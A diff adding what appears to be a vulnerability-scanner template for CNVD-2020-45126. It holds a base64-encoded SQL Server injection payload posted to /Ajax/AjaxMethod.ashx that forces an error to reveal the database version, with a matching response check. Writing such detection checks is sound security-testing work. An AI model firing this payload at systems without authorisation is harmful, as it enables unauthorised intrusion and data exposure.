@@ -1,0 +1,12 @@
+name: poc-yaml-CNVD-2020-45126
+rules:
+  - method: POST
+    path: /Ajax/AjaxMethod.ashx
+    body: >-
+      action=getEmpByname&Name=YWRtaW4nO2RlY2xhcmUgQGEgbnZhcmNoYXIoMjAwMCkgc2V0IEBhPSdzZWxlY3QgY29udmVydChpbnQsQEB2ZXJzaW9uKScgZXhlYyhAYSkgLS0=
+    follow_redirects: false
+    expression: |2
+       response.status == 500 && response.body.bcontains(b'SQL Server')
+detail:
+  author: qidian
+  links: https://www.yuque.com/qiqiqiqiqi-9vk6f/gd164g/nc966u
